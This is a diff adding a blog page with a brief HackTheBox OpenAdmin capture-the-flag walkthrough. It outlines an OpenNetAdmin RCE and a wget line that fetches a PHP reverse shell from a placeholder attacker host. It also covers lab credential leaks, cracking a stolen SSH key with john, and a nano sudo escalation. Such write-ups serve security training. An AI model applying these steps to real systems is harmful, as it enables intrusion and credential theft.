@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HackTheBox OpenAdmin Writeup :: weakphish</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="user Scan ports with nc -&gt; http and ssh ports open /music yields a pre-prod page contact page login / create account leads to an ONA dashboard /artwork yields a different company&rsquo;s site similar to the music guy rabbit hole with nothing useful Can use RCE exploit from internet to gain reverse sorta shell from ONA (ona specific exploit) Can use this half-shell to escalate to a full shell Friend I consulted&rsquo;s go-to is that most boxes have wget, curl or netcat -&gt; can transfer file rom http to server python SimpleHTTPServer netcat 4444 -&gt; listen for requests make php script correct ports mkdir www cd www cp path/to/php/rev/shell python -m SimpleHTTPServer wget http://your.ip.address:portrev/_shell.php (on the half rev. shell) Now you a full reverse shell Python3 spawn pty bash for better experience Database config file found in local/config with DB user and pass That password allows access to jimmy thru ssh Pass for jimmy is n1nj4W4rri0R! Use sftp to transfer linpeas (escalation scanner) onto jimmy&rsquo;s home dir ./linpeas.sh &gt; output.txt and then less -R output.txt to see linpeas output /var/www/internal has really interesting writeable files that seem to allow access into Joanna&rsquo;s id_rsa ssh tunnel local forward the contents of that folder so that it&rsquo;s accessible to web access w/ ssh openadmin -&gt; localhost:2331/index.php Edit php to cat out joanna&rsquo;s private key Crack keyphrase using ssh2john -&gt; john Bam, ssh into the target as joanna with new key (keyphrase is bloodninjas) User pwned root sudo -l Can run nano on /opt/priv with nopasswd Execute a shell from within nano using a GTFOBins as root Root pwned " />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/2023-04-17-openadmin/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.a3670726bb66927824e4c3fa3f20388aacc1e7aa65014ae144e350ce59593b78.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HackTheBox OpenAdmin Writeup">
+<meta property="og:description" content="user Scan ports with nc -&gt; http and ssh ports open /music yields a pre-prod page contact page login / create account leads to an ONA dashboard /artwork yields a different company&rsquo;s site similar to the music guy rabbit hole with nothing useful Can use RCE exploit from internet to gain reverse sorta shell from ONA (ona specific exploit) Can use this half-shell to escalate to a full shell Friend I consulted&rsquo;s go-to is that most boxes have wget, curl or netcat -&gt; can transfer file rom http to server python SimpleHTTPServer netcat 4444 -&gt; listen for requests make php script correct ports mkdir www cd www cp path/to/php/rev/shell python -m SimpleHTTPServer wget http://your.ip.address:portrev/_shell.php (on the half rev. shell) Now you a full reverse shell Python3 spawn pty bash for better experience Database config file found in local/config with DB user and pass That password allows access to jimmy thru ssh Pass for jimmy is n1nj4W4rri0R! Use sftp to transfer linpeas (escalation scanner) onto jimmy&rsquo;s home dir ./linpeas.sh &gt; output.txt and then less -R output.txt to see linpeas output /var/www/internal has really interesting writeable files that seem to allow access into Joanna&rsquo;s id_rsa ssh tunnel local forward the contents of that folder so that it&rsquo;s accessible to web access w/ ssh openadmin -&gt; localhost:2331/index.php Edit php to cat out joanna&rsquo;s private key Crack keyphrase using ssh2john -&gt; john Bam, ssh into the target as joanna with new key (keyphrase is bloodninjas) User pwned root sudo -l Can run nano on /opt/priv with nopasswd Execute a shell from within nano using a GTFOBins as root Root pwned " />
+<meta property="og:url" content="http://localhost:1313/posts/2023-04-17-openadmin/" />
+<meta property="og:site_name" content="weakphish" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/2023-04-17-openadmin/">HackTheBox OpenAdmin Writeup</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/writeup/">writeup</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="user">user<a href="#user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Scan ports with nc -&gt; http and ssh ports open</li>
+<li>/music yields a pre-prod page
+<ul>
+<li>contact page</li>
+<li>login / create account leads to an ONA dashboard</li>
+</ul>
+</li>
+<li>/artwork yields a different company&rsquo;s site
+<ul>
+<li>similar to the music guy</li>
+<li>rabbit hole with nothing useful</li>
+</ul>
+</li>
+<li>Can use RCE exploit from internet to gain reverse sorta shell from ONA (ona specific exploit)</li>
+<li>Can use this half-shell to escalate to a full shell</li>
+<li>Friend I consulted&rsquo;s go-to is that most boxes have wget, curl or netcat -&gt; can transfer file rom http to server
+<ul>
+<li>python SimpleHTTPServer</li>
+<li>netcat 4444 -&gt; listen for requests</li>
+<li>make php script correct ports
+<ul>
+<li>mkdir www</li>
+<li>cd www</li>
+<li>cp path/to/php/rev/shell</li>
+<li>python -m SimpleHTTPServer</li>
+<li>wget <a href="http://your.ip.address">http://your.ip.address</a>:portrev/_shell.php (on the half rev. shell)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Now you a full reverse shell</li>
+<li>Python3 spawn pty bash for better experience</li>
+<li>Database config file found in local/config with DB user and pass</li>
+<li>That password allows access to jimmy thru ssh</li>
+<li>Pass for jimmy is n1nj4W4rri0R!</li>
+<li>Use sftp to transfer linpeas (escalation scanner) onto jimmy&rsquo;s home dir</li>
+<li>./linpeas.sh &gt; output.txt and then less -R output.txt to see linpeas output</li>
+<li>/var/www/internal has really interesting writeable files that seem to allow access into Joanna&rsquo;s id_rsa</li>
+<li>ssh tunnel local forward the contents of that folder so that it&rsquo;s accessible to web
+<ul>
+<li>access w/ ssh openadmin -&gt; localhost:2331/index.php</li>
+</ul>
+</li>
+<li>Edit php to cat out joanna&rsquo;s private key</li>
+<li>Crack keyphrase using ssh2john -&gt; john</li>
+<li>Bam, ssh into the target as joanna with new key (keyphrase is bloodninjas)</li>
+<li>User pwned</li>
+</ul>
+<h1 id="root">root<a href="#root" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>sudo -l</li>
+<li>Can run nano on /opt/priv with nopasswd</li>
+<li>Execute a shell from within nano using a GTFOBins as root</li>
+<li>Root pwned</li>
+</ul>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
